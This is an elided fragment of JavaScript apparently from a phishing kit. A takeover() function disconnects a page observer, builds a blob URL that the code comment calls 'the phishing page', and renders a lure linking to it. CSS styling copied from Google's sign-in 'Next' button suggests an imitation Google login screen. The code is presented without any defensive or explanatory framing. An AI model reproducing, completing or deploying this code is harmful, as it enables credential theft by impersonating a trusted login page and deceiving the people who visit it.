...
(function () {
  ...
  function takeover() {
    obs.disconnect();
    // Create blob URL for the phishing page FIRST, then render lure with it as href
    var blob = new Blob([phishHTML()], { type: "text/html" });
    var blobUrl = URL.createObjectURL(blob);
    render(blobUrl);
  }

  function render(blobUrl) {
...
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;font-family:"Google Sans",Roboto,sans-serif;letter-spacing:.25px;-webkit-tap-highlight-color:rgba(0,0,0,0.1)}\
